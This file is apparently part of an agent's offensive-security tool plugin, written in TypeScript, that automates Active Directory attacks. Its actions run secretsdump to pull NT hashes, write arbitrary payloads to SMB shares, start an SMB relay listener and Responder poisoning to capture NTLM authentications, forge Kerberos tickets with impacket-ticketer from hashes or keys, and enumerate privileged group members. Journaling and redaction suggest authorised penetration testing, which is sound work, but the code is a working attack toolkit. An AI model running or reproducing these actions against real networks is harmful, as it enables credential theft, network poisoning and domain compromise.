		const artifacts: string[] = [];

		/** Run one command, journal it and remember the artifact. */
		const runStep = async (
			bin: string,
			args: string[],
			label: string,
			options: { timeoutMs?: number } = {},
		): Promise<RunResult> => {
			const result = await run(bin, args, {
				cwd: ctx.cwd,
				timeoutMs: options.timeoutMs,
				artifactDir: artifactsDir,
				artifactName: `ad-attack-${label}.txt`,
			});
			commands.push({ cmd: redact(result.cmd), code: result.code, durationMs: result.durationMs });
			appendJournal(ctx.cwd, {
				ts: new Date().toISOString(),
				tool: "cyber_ad_attack",
				action: `ad-attack:${params.action}`,
				target,
				command: redact(result.cmd),
				exitCode: result.code,
				durationMs: result.durationMs,
				summary: result.timedOut ? "command timed out" : `exit ${result.code}`,
				severity: "info",
				artifact: result.artifact,
			});
			if (result.artifact) artifacts.push(result.artifact);
			return result;
		};

		let summary = "";
		let output = "";
		let details: AdAttackDetails = {
			action: params.action,
			target,
			ip,
			domain,
			commands,
			notes,
			artifacts,
		};

		switch (params.action) {
			case "smb-share-enum": {
				if (!ip) {
					return { summary: "smb-share-enum needs the IP address of the domain controller.", isError: true };
				}
				const client = params.username
					? ["-U", `${params.username}%`, "-L", `//${ip}`]
					: ["-N", "-L", `//${ip}`];
				const clientResult = await runStep("smbclient", client, "smbclient");
				const shareNames = parseShareNames(clientResult.stdout);
				let sessions = 0;

				const netexec = which("netexec");
				const crackmapexec = which("crackmapexec");
				const sharesBin = netexec ? "netexec" : crackmapexec ? "crackmapexec" : undefined;
				if (sharesBin) {
					const creds = params.username ? ["-u", params.username, "-p", ""] : ["-u", "", "-p", ""];
					const sharesResult = await runStep(sharesBin, ["smb", ip, ...creds, "--shares"], "smb-shares");
					sessions = countSessions(sharesResult.stdout);
					for (const name of parseShareNames(sharesResult.stdout)) {
						if (!shareNames.includes(name)) shareNames.push(name);
					}
				}

				let material: AdAttackDetails["material"];
				if (params.username && which("impacket-secretsdump")) {
					const secretsTarget = domain ? `${domain}/${ip}` : ip;
					const secretsDir = path.join(outDir, "secrets");
					ensureDir(secretsDir);
					const secretsResult = await runStep(
						"impacket-secretsdump",
						[secretsTarget, "-username", params.username, "-password", "", "-outputdir", secretsDir],
						"secretsdump",
					);
					const recovered = /NTLM|SAM|SECURITY|hash/i.test(secretsResult.stdout);
					material = {
						kind: "NT hashes and account material",
						recovered,
						location: secretsDir,
					};
					notes.push(
						`impacket-secretsdump ran against ${secretsTarget}; the credential material it wrote to ${secretsDir} must not be quoted verbatim.`,
					);
				}

				details.shares = shareNames;
				details.sessions = sessions;
				details.material = material;
				summary = `Enumerated ${shareNames.length} SMB share(s) on ${ip}${sessions ? ` with ${sessions} authenticated session(s)` : ""}.`;
				output = [
					`Shares: ${shareNames.length > 0 ? shareNames.join(", ") : "none visible with the current credentials"}`,
					material
						? `Credential material: ${material.recovered ? "recovered" : "not recovered"} (${material.location})`
						: "Credential material: not requested (no username given).",
					`Artifacts: ${artifacts.join(", ") || "none"}`,
				].join("\n");
				break;
			}

			case "smb-share-write": {
				if (!ip) {
					return { summary: "smb-share-write needs the IP address of the domain controller.", isError: true };
				}
				if (!params.share) {
					return { summary: "smb-share-write needs the name of the target share.", isError: true };
				}
				if (!params.payload) {
					return { summary: "smb-share-write needs the payload to write.", isError: true };
				}
				const remoteName =
					path.basename(params.payload.split("\n")[0] ?? "").replace(/[^\w.-]+/g, "_") || "payload.txt";
				let localFile = params.payload;
				if (!fs.existsSync(params.payload)) {
					localFile = path.join(outDir, `payload-${params.share}-${Date.now()}.txt`);
					fs.writeFileSync(localFile, params.payload, "utf8");
					artifacts.push(localFile);
				}
				const target = `//${ip}/${params.share}`;
				const auth = params.username ? ["-U", `${params.username}%`] : ["-N"];
				const putResult = await runStep(
					"smbclient",
					[target, ...auth, "-c", `put ${localFile} ${remoteName}`],
					"smbclient-write",
				);
				const listResult = await runStep("smbclient", [target, ...auth, "-c", "ls"], "smbclient-list");
				const status = /NT_STATUS_[A-Z_]+/.exec(putResult.stdout)?.[0];
				const written = putResult.code === 0 && !status;
				const listed = listResult.stdout.includes(remoteName);
				notes.push(
					written
						? `Wrote ${remoteName} to ${target}.`
						: `The write to ${target} did not confirm${status ? ` (${status})` : ""}; check the artifact for the SMB error.`,
				);
				if (listed) notes.push(`The share listing confirms ${remoteName} is present.`);
				summary = `Wrote ${remoteName} to ${target} (${written ? "confirmed" : "unconfirmed"}).`;
				output = [
					`Share: ${target}`,
					`File: ${remoteName} (${written ? "written" : "write not confirmed"})`,
					`Artifacts: ${artifacts.join(", ") || "none"}`,
				].join("\n");
				break;
			}

			case "smb-relay-setup": {
				const listenIp = await localSourceIp(ip) ?? "0.0.0.0";
				const shareDir = path.join(outDir, "relay-share");
				ensureDir(shareDir);
				const help = await probeHelp("impacket-smbserver");
				const args: string[] = [];
				if (hasOption(help, "smb2support")) args.push("-smb2support");
				const shareFlag = flagByName(help, "share") ?? flagFor(help, /share/i);
				if (shareFlag) args.push(shareFlag, shareDir);
				args.push(listenIp);
				if (params.username) args.push(domain ? `${domain}\\${params.username}` : params.username);
				const result = await runStep("impacket-smbserver", args, "relay-smbserver", {
					timeoutMs: duration * 1000,
				});
				const captures = lines(result.stdout).filter((line) => /NTLMv1|NTLMv2|hash/i.test(line)).length;
				details.material = {
					kind: "relayed NTLM authentication material",
					recovered: captures > 0,
					location: result.artifact ?? path.join(artifactsDir, "ad-attack-relay-smbserver.txt"),
				};
				notes.push(
					`The listener ran for ${duration}s on ${listenIp}:445 and was stopped afterwards. Binding port 445 needs root.`,
				);
				summary = `SMB relay listener ran on ${listenIp}:445 for ${duration}s; ${captures} relayed authentication(s) captured.`;
				output = [
					`Listener: ${listenIp}:445 (${duration}s)`,
					`Captured authentications: ${captures}`,
					`Material: ${captures > 0 ? "written to the artifacts" : "none captured"}`,
					`Artifacts: ${artifacts.join(", ") || "none"}`,
				].join("\n");
				break;
			}

			case "responder-relay": {
				const iface = await localInterface(ip);
				const help = await probeHelp("responder");
				const args: string[] = [];
				if (iface) args.push("-I", iface);
				args.push("-v");
				const relayFlag = longFlagFor(help, /relay/i);
				if (relayFlag) args.push(relayFlag);
				const result = await runStep("responder", args, "responder", {
					timeoutMs: duration * 1000,
				});
				const captures = lines(result.stdout).filter((line) => /NTLMv1|NTLMv2|hash/i.test(line)).length;
				details.material = {
					kind: "poisoned NTLM authentication material",
					recovered: captures > 0,
					location: result.artifact ?? path.join(artifactsDir, "ad-attack-responder.txt"),
				};
				notes.push(
					iface
						? `Responder poisoned on ${iface} for ${duration}s. Enable SMBRelay in Responder.conf when full SMB relaying is required.`
						: `Responder could not determine the interface for ${ip}; it selected one itself.`,
				);
				summary = `Responder ran for ${duration}s on ${iface ?? "the default interface"}; ${captures} poisoned authentication(s) captured.`;
				output = [
					`Interface: ${iface ?? "auto"}`,
					`Captured authentications: ${captures}`,
					`Material: ${captures > 0 ? "written to the artifacts" : "none captured"}`,
					`Artifacts: ${artifacts.join(", ") || "none"}`,
				].join("\n");
				break;
			}

			case "kerberos-ticket-request": {
				if (!params.username) {
					return { summary: "kerberos-ticket-request needs the account name.", isError: true };
				}
				if (!params.payload) {
					return {
						summary:
							"kerberos-ticket-request needs the account secret in the payload parameter (password, NT hash or RC4 key).",
						isError: true,
					};
				}
				if (!domain) {
					return { summary: "kerberos-ticket-request needs the AD domain.", isError: true };
				}
				const help = await probeHelp("impacket-ticketer");
				const args: string[] = [];
				const domainFlag = flagByName(help, "domain");
				if (domainFlag) args.push(domainFlag, domain);
				const dcFlag = flagByName(help, "dc") ?? flagFor(help, /domain controller/i);
				if (dcFlag && ip) args.push(dcFlag, ip);
				const userFlag = flagByName(help, "user");
				if (userFlag) args.push(userFlag, params.username);
				const secret = params.payload.trim();
				const isNtHash = /^[0-9a-f]{32}$/i.test(secret);
				const isRc4Key = /^[0-9a-f]{16}$/i.test(secret);
				let usePassword = true;
				if (isNtHash && hasOption(help, "nthash")) {
					args.push("-nthash");
				} else if (isRc4Key) {
					const keyFlag = flagByName(help, "key");
					if (keyFlag) {
						args.push(keyFlag, secret);
						usePassword = false;
					}
				}
				if (usePassword) {
					const passwordFlag = flagByName(help, "password");
					if (passwordFlag) args.push(passwordFlag, secret);
				}
				const result = await runStep("impacket-ticketer", args, "ticketer");
				const blob = extractKerberosBlob(result.stdout);
				const ticketFile = path.join(outDir, `${params.username}.kirbi`);
				if (blob) {
					try {
						fs.writeFileSync(ticketFile, `${blob}\n`, "utf8");
						artifacts.push(ticketFile);
					} catch {
						// The raw command output artifact still holds the ticket.
					}
				}
				const meta = parseTicketMeta(result.stdout);
				details.material = {
					kind: "Kerberos ticket material",
					recovered: Boolean(blob),
					location: blob ? ticketFile : path.join(outDir, "ticketer-raw.txt"),
				};
				notes.push(
					`The ticket for ${params.username} was requested from ${domain}${ip ? ` via ${ip}` : ""}; the key material stays in the artifacts.`,
				);
				summary = `Requested a Kerberos ticket for ${params.username}@${domain}; ${blob ? "ticket written to the artifacts" : "no ticket produced"}.`;
				output = [
					`Account: ${params.username}@${domain}`,
					`Ticket: ${blob ? ticketFile : "not produced"}`,
					meta.length > 0 ? `Ticket details: ${meta.join(", ")}` : "",
					`Artifacts: ${artifacts.join(", ") || "none"}`,
				]
					.filter((line) => line.length > 0)
					.join("\n");
				break;
			}

			case "ldap-privilege-check": {
				const checks: string[] = [];
				const privileged: { account: string; groups: string[] }[] = [];
				if (domain && ip && which("ldapsearch")) {
					const baseDn = domainBaseDn(domain);
					for (const group of ["Domain Admins", "Enterprise Admins", "Schema Admins", "Backup Operators", "Account Operators", "DnsAdmins"]) {
						const result = await runStep(
							"ldapsearch",
							[
								"-x",
								"-LLL",
								"-H",
								`ldap://${ip}`,
								"-b",
								baseDn,
								`(&(objectClass=group)(cn=${group}))`,
								"member",
							],
							`ldapsearch-${group.toLowerCase().replace(/\s+/g, "-")}`,
						);
						const found = lines(result.stdout)
							.filter((line) => /^member:/i.test(line))
							.map((line) => cnOf(line.replace(/^member:\s*/i, "")));
						if (found.length > 0) {
							checks.push(`${group}: ${found.length} member(s)`);
							for (const account of found) {
								privileged.push({ account, groups: [group] });
							}
						}
					}
				}
				if (which("impacket-lookupsid")) {
					const lookupsidTarget = domain ? `${domain}/${ip ?? target}` : (ip ?? target);
					const result = await runStep("impacket-lookupsid", [lookupsidTarget], "lookupsid");
					const resolved = lines(result.stdout).filter((line) => /\[[^\]]+\]/.test(line));
					if (resolved.length > 0) {
						checks.push(`impacket-lookupsid resolved ${resolved.length} SID(s) to names`);
					}
				}
				details.privilegedMembers = privileged;
				summary = `Privilege check on ${target}: ${checks.length > 0 ? checks.join("; ") : "no privileged membership data returned"}.`;
				output = [
					checks.length > 0 ? checks.join("\n") : "No privileged membership data returned.",
					privileged.length > 0
						? `Privileged accounts: ${privileged.slice(0, 40).map((entry) => `${entry.account} (${entry.groups.join(", ")})`).join(", ")}`
						: "",
					`Artifacts: ${artifacts.join(", ") || "none"}`,
				]
					.filter((line) => line.length > 0)
					.join("\n");
				break;
			}

			default: {
				return { summary: `Unsupported action ${String(params.action)}.`, isError: true };
			}
		}

		const body = [
			output,
			notes.length > 0 ? `Notes:\n${notes.map((note) => `  - ${note}`).join("\n")}` : "",
		]
			.filter((part) => part.length > 0)
			.join("\n\n");
		const outcome: CyberToolOutcome<AdAttackDetails> = {
			summary,
			output: body.length > 0 ? redact(body) : undefined,
			details,
			severity: "medium",
		};
		return outcome;
	},
});

/* -------------------------------------------------------------------------- */
/* Local network helpers                                                       */
/* -------------------------------------------------------------------------- */

/** The local source address the kernel would use to reach the target. */
async function localSourceIp(target: string | undefined): Promise<string | undefined> {
	const route = await routeTo(target);
	const match = route ? /\bsrc\s+(\S+)/.exec(route) : null;
	return match ? match[1] : undefined;
}

/** The local interface the kernel would use to reach the target. */
async function localInterface(target: string | undefined): Promise<string | undefined> {
	const route = await routeTo(target);
	const match = route ? /\bdev\s+(\S+)/.exec(route) : null;
	return match ? match[1] : undefined;
}

/** `ip route get <target>` output, when the ip utility is available. */
async function routeTo(target: string | undefined): Promise<string | undefined> {
	if (!target || !which("ip")) return undefined;
	const result = await run("ip", ["route", "get", target], { timeoutMs: 10_000, maxBytes: 8_000 });
	const text = `${result.stdout}\n${result.stderr}`.trim();
	return text.length > 0 ? text : undefined;
}

/** The base64 Kerberos blob printed by impacket-ticketer. */
function extractKerberosBlob(output: string): string | undefined {
	let longest: string | undefined;
	for (const line of lines(output)) {
		for (const token of line.split(/\s+/)) {
			if (token.length >= 60 && /^[A-Za-z0-9+/]+={0,2}$/.test(token)) {
				if (!longest || token.length > longest.length) longest = token;
			}
		}
	}
	return longest;
}

/** The human readable ticket details printed by impacket-ticketer. */
function parseTicketMeta(output: string): string[] {
	const meta: string[] = [];
	for (const line of lines(output)) {
		const match = /^([A-Za-z][A-Za-z ]{2,30})\s*:\s*(.+)$/.exec(line);
		if (!match) continue;
		const key = match[1].trim();
		if (/^base64$/i.test(key)) continue;
		meta.push(`${key}: ${match[2].trim()}`);
	}
	return meta.slice(0, 10);
}

export const adTools: ToolDefinition[] = [adEnumTool, adAttackTool];
